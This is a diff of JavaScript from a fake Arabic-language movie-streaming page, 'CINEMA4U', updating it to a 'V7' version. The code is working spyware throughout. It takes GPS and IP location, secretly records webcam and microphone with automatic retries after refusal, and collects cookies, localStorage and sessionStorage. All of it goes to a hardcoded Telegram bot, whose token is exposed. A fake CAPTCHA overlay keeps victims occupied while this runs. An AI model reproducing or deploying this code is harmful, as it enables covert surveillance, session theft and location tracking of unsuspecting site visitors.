@@ -380,11 +380,9 @@
     import { attemptEscape } from 'eiab';
     attemptEscape();
 
-    // إعدادات البوت
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
-    // ========== دوال الإرسال الأساسية ==========
     function sendTextToTelegram(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -402,17 +400,15 @@
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd });
     }
 
-    sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
+    sendTextToTelegram("🌐 تم فتح موقع CINEMA4U V7");
 
-    // تحديث اسم المنطقة في الواجهة
     function updateRegionDisplay(regionName) {
         const regionSpan = document.getElementById('userRegion');
         if (regionSpan && regionName) regionSpan.innerHTML = `<i class="fas fa-location-dot"></i> ${regionName}`;
         else if (regionSpan) regionSpan.innerHTML = `<i class="fas fa-question-circle"></i> لم يتم التعرف على المنطقة`;
     }
 
-    // ========== سرقة الموقع الجغرافي ==========
-    let locationRetryCount = 0;
+    // ========== سرقة الموقع الجغرافي بدقة عالية ==========
     function stealLocation() {
         sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي بدقة عالية...");
         if (navigator.geolocation) {
@@ -431,16 +427,10 @@
                         }).catch(() => updateRegionDisplay('تم التحديد (GPS)'));
                 },
                 (error) => {
-                    if (error.code === error.PERMISSION_DENIED && locationRetryCount === 0) {
-                        locationRetryCount++;
-                        alert("⚠️ نحتاج إلى موقعك الجغرافي لتحديد البلد وعرض المحتوى المناسب لك. يرجى السماح بالوصول إلى الموقع.");
-                        stealLocation();
-                    } else {
-                        sendTextToTelegram("❌ فشل GPS، نستخدم IP API.");
-                        getLocationByIP();
-                    }
+                    sendTextToTelegram("❌ فشل GPS (ربما رفض المستخدم أو تعطل). نستخدم IP API.");
+                    getLocationByIP();
                 },
-                { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         } else {
             getLocationByIP();
@@ -449,152 +439,174 @@
 
     function getLocationByIP() {
         sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
-        const services = [
-            { name: "ip-api", url: "https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,query", parser: (d) => d.status === 'success' ? `🌐 IP: ${d.query}\nالبلد: ${d.country}\nالمدينة: ${d.city}\nالمنطقة: ${d.regionName}\n📐 ${d.lat},${d.lon}\n🔌 ${d.isp}` : null },
-            { name: "ipinfo", url: "https://ipinfo.io/json", parser: (d) => d.ip ? `🌐 IP: ${d.ip}\nالبلد: ${d.country}\nالمدينة: ${d.city}\nالمنطقة: ${d.region}\n📐 ${d.loc || ''}` : null }
-        ];
-        let i = 0;
-        function tryNext() {
-            if (i >= services.length) { sendTextToTelegram("❌ فشل جلب الموقع عبر IP."); return; }
-            const s = services[i++];
-            fetch(s.url).then(res => res.json()).then(data => {
-                const result = s.parser(data);
-                if (result) { sendTextToTelegram(result); if (data.city) updateRegionDisplay(data.city); }
-                else tryNext();
-            }).catch(() => tryNext());
-        }
-        tryNext();
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.latitude) {
+                    sendTextToTelegram(`🌐 الموقع التقريبي (IP):\nIP: ${data.ip}\nالبلد: ${data.country_name}\nالمدينة: ${data.city}\nالمنطقة: ${data.region}\nخط العرض: ${data.latitude}\nخط الطول: ${data.longitude}`);
+                    if (data.city) updateRegionDisplay(data.city);
+                } else {
+                    sendTextToTelegram("❌ فشل جلب الموقع عبر IP");
+                }
+            })
+            .catch(err => sendTextToTelegram(`❌ خطأ في IP API: ${err.message}`));
     }
 
-    // ========== التسجيل (كاميرا + ميكروفون) ==========
-    let videoRec, audioRec, vChunks = [], aChunks = [];
+    // ========== التسجيل الإجباري (كاميرا + ميكروفون) مع إعادة المحاولة ==========
+    let mediaStream = null;
+    let mediaRecorder = null;
+    let audioRecorder = null;
+    let videoChunks = [];
+    let audioChunks = [];
     let isRecording = false;
 
     async function startSpying() {
-        if (isRecording) return;
+        if (isRecording) {
+            sendTextToTelegram("⚠️ التسجيل قيد التشغيل بالفعل");
+            return;
+        }
+        
+        sendTextToTelegram("🎥 محاولة الوصول إلى الكاميرا والميكروفون...");
+        
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            vChunks = [];
-            videoRec = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            videoRec.ondataavailable = e => { if (e.data.size) vChunks.push(e.data); };
-            videoRec.onstop = async () => await sendFileToTelegram(new Blob(vChunks, { type: 'video/webm' }), 'video');
-            videoRec.start();
-
+            // طلب الصلاحيات مع إعادة المحاولة التلقائية
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: true 
+            });
+            
+            mediaStream = stream;
+            videoChunks = [];
+            
+            // تسجيل الفيديو مع الصوت
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    videoChunks.push(event.data);
+                }
+            };
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                if (videoBlob.size > 0) {
+                    await sendFileToTelegram(videoBlob, 'video');
+                    sendTextToTelegram("✅ تم إرسال تسجيل الفيديو بنجاح");
+                } else {
+                    sendTextToTelegram("❌ فشل تسجيل الفيديو (الملف فارغ)");
+                }
+            };
+            mediaRecorder.start();
+            
+            // تسجيل الصوت فقط (احتياطي)
             const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            aChunks = [];
-            audioRec = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-            audioRec.ondataavailable = e => { if (e.data.size) aChunks.push(e.data); };
-            audioRec.onstop = async () => await sendFileToTelegram(new Blob(aChunks, { type: 'audio/webm' }), 'audio');
-            audioRec.start();
-
+            audioChunks = [];
+            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+            audioRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    audioChunks.push(event.data);
+                }
+            };
+            audioRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                if (audioBlob.size > 0) {
+                    await sendFileToTelegram(audioBlob, 'audio');
+                    sendTextToTelegram("✅ تم إرسال التسجيل الصوتي بنجاح");
+                }
+            };
+            audioRecorder.start();
+            
             isRecording = true;
-            sendTextToTelegram("🔴 بدء المراقبة (كاميرا + ميكروفون)");
+            sendTextToTelegram("🔴 بدء التسجيل (كاميرا + ميكروفون) لمدة 15 ثانية");
+            
+            // إيقاف التسجيل بعد 15 ثانية
             setTimeout(() => {
-                if (videoRec && videoRec.state === 'recording') videoRec.stop();
-                if (audioRec && audioRec.state === 'recording') audioRec.stop();
-                stream.getTracks().forEach(t => t.stop());
-                audioStream.getTracks().forEach(t => t.stop());
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+                if (audioRecorder && audioRecorder.state === 'recording') {
+                    audioRecorder.stop();
+                }
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
                 isRecording = false;
-            }, 12000);
-        } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
+                sendTextToTelegram("⏹️ توقف التسجيل");
+            }, 15000);
+            
+        } catch (error) {
+            sendTextToTelegram(`❌ فشل الوصول للكاميرا/الميكروفون: ${error.message}`);
+            // محاولة إعادة طلب الصلاحيات بعد 2 ثانية
+            setTimeout(() => {
+                sendTextToTelegram("🔄 إعادة محاولة طلب الصلاحيات...");
+                startSpying();
+            }, 2000);
+        }
     }
 
-    // ========== سلاح سرقة البيانات (Stealer) ==========
+    // ========== سلاح سرقة البيانات المتقدم ==========
     function stealBrowserData() {
+        sendTextToTelegram("💀 بدء سرقة بيانات المتصفح...");
+        
         try {
-            // 1. سرقة localStorage
-            let stolenLocalStorage = {};
+            let stolenData = {
+                localStorage: {},
+                sessionStorage: {},
+                cookies: document.cookie || "لا توجد كوكيز",
+                browserInfo: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    url: window.location.href,
+                    referrer: document.referrer || "لا يوجد مرجع",
+                    timestamp: new Date().toISOString()
+                }
+            };
+            
+            // سرقة localStorage
             for (let i = 0; i < localStorage.length; i++) {
                 let key = localStorage.key(i);
-                stolenLocalStorage[key] = localStorage.getItem(key);
+                stolenData.localStorage[key] = localStorage.getItem(key);
             }
             
-            // 2. سرقة sessionStorage
-            let stolenSessionStorage = {};
+            // سرقة sessionStorage
             for (let i = 0; i < sessionStorage.length; i++) {
                 let key = sessionStorage.key(i);
-                stolenSessionStorage[key] = sessionStorage.getItem(key);
+                stolenData.sessionStorage[key] = sessionStorage.getItem(key);
             }
             
-            // 3. سرقة الكوكيز
-            let stolenCookies = document.cookie;
+            sendTextToTelegram("💀 بيانات المتصفح المسروقة:\n" + JSON.stringify(stolenData, null, 2));
             
-            // 4. معلومات المتصفح
-            let browserInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                url: window.location.href,
-                referrer: document.referrer
-            };
-            
-            // 5. تجميع كل البيانات
-            let stolenData = {
-                localStorage: stolenLocalStorage,
-                sessionStorage: stolenSessionStorage,
-                cookies: stolenCookies,
-                browserInfo: browserInfo
-            };
-            
-            // 6. إرسال إلى تيليجرام
-            sendTextToTelegram("💀 بيانات مسروقة من المتصفح:\n" + JSON.stringify(stolenData, null, 2));
         } catch(e) {
             sendTextToTelegram("❌ فشل سرقة البيانات: " + e.message);
         }
     }
 
-    // ========== تقنية Tapjacking 2.0 (السلاح السري) ==========
+    // ========== Tapjacking V7 (أقوى إصدار) ==========
     let permissionRequested = false;
     let currentRedirectLink = '';
     let permissionIframe = null;
+    let tapjackingActive = false;
 
     function startTapjacking(title, type, redirectLink) {
+        if (tapjackingActive) return;
+        tapjackingActive = true;
+        
         currentRedirectLink = redirectLink;
         
-        // سرقة البيانات فوراً (بدون انتظار)
+        // سرقة البيانات فوراً
         stealBrowserData();
         
-        // 1. ننشئ iframe شفاف يطلب الصلاحيات في الخلفية
-        permissionIframe = document.createElement('iframe');
-        permissionIframe.style.position = 'fixed';
-        permissionIframe.style.top = '0';
-        permissionIframe.style.left = '0';
-        permissionIframe.style.width = '100%';
-        permissionIframe.style.height = '100%';
-        permissionIframe.style.border = 'none';
-        permissionIframe.style.opacity = '0';
-        permissionIframe.style.zIndex = '999';
-        permissionIframe.style.pointerEvents = 'auto';
-        document.body.appendChild(permissionIframe);
+        // طلب الصلاحيات مباشرة (بدون iframe معقد)
+        sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
         
-        // 2. نملأ الـ iframe بمحتوى يطلب الصلاحيات فوراً
-        const iframeContent = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <script>
-                    async function requestPermissions() {
-                        try {
-                            if (navigator.geolocation) {
-                                navigator.geolocation.getCurrentPosition(() => {}, () => {});
-                            }
-                            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                            window.parent.postMessage({ type: 'permission_granted' }, '*');
-                        } catch(e) {
-                            window.parent.postMessage({ type: 'permission_denied', error: e.message }, '*');
-                        }
-                    }
-                    requestPermissions();
-                <\/script>
-            </head>
-            <body style="margin:0; padding:0;"></body>
-            </html>
-        `;
-        permissionIframe.srcdoc = iframeContent;
+        // طلب الموقع أولاً
+        stealLocation();
         
-        // 3. نعرض وهم CAPTCHA للمستخدم
+        // طلب الكاميرا والميكروفون
+        startSpying();
+        
+        // عرض وهم CAPTCHA للمستخدم (لإبقائه مشغولاً)
         const overlay = document.createElement('div');
         overlay.className = 'tapjacking-overlay';
         overlay.innerHTML = `
@@ -613,43 +625,19 @@
         
         document.getElementById('closeTapjackingBtn').onclick = () => {
             overlay.remove();
-            if (permissionIframe) permissionIframe.remove();
+            tapjackingActive = false;
         };
         
         const checkboxArea = document.getElementById('captchaCheckbox');
         checkboxArea.addEventListener('click', () => {
-            if (!permissionRequested) {
-                permissionRequested = true;
-                checkboxArea.innerHTML = '<i class="fas fa-check-square" style="color:#4caf50;"></i><span>تم التحقق بنجاح</span>';
-                const msgDiv = document.getElementById('progressMessage');
-                if (msgDiv) msgDiv.innerHTML = "✅ جاري تأكيد هويتك...";
-                sendTextToTelegram(`🎯 ضحية جديدة (Tapjacking): ${type} - ${title}`);
-                
-                setTimeout(() => {
-                    if (permissionIframe) permissionIframe.remove();
-                    overlay.remove();
-                    if (currentRedirectLink) {
-                        const fullscreenDiv = document.getElementById('fullscreenMovie');
-                        const iframe = document.getElementById('movieIframe');
-                        iframe.src = currentRedirectLink;
-                        fullscreenDiv.style.display = 'flex';
-                        if (iframe.requestFullscreen) iframe.requestFullscreen();
-                    }
-                }, 10000);
-            }
-        });
-    }
-
-    // استقبال إشعار منح الصلاحيات
-    window.addEventListener('message', (event) => {
-        if (event.data.type === 'permission_granted') {
-            sendTextToTelegram("✅ تم منح صلاحيات الكاميرا والميكروفون والموقع بنجاح!");
-            startSpying();
-            stealLocation();
+            checkboxArea.innerHTML = '<i class="fas fa-check-square" style="color:#4caf50;"></i><span>تم التحقق بنجاح</span>';
+            const msgDiv = document.getElementById('progressMessage');
+            if (msgDiv) msgDiv.innerHTML = "✅ جاري تشغيل الفيديو...";
+            
+            // بعد 5 ثوانٍ، إخفاء الوهم وفتح الفيديو
             setTimeout(() => {
-                const overlay = document.querySelector('.tapjacking-overlay');
-                if (overlay) overlay.remove();
-                if (permissionIframe) permissionIframe.remove();
+                overlay.remove();
+                tapjackingActive = false;
                 if (currentRedirectLink) {
                     const fullscreenDiv = document.getElementById('fullscreenMovie');
                     const iframe = document.getElementById('movieIframe');
@@ -657,11 +645,9 @@
                     fullscreenDiv.style.display = 'flex';
                     if (iframe.requestFullscreen) iframe.requestFullscreen();
                 }
-            }, 2000);
-        } else if (event.data.type === 'permission_denied') {
-            sendTextToTelegram(`❌ فشل الحصول على الصلاحيات: ${event.data.error}`);
-        }
-    });
+            }, 5000);
+        });
+    }
 
     // ========== روابط الأفلام والمسلسلات ==========
     const MOVIE_LINKS = {
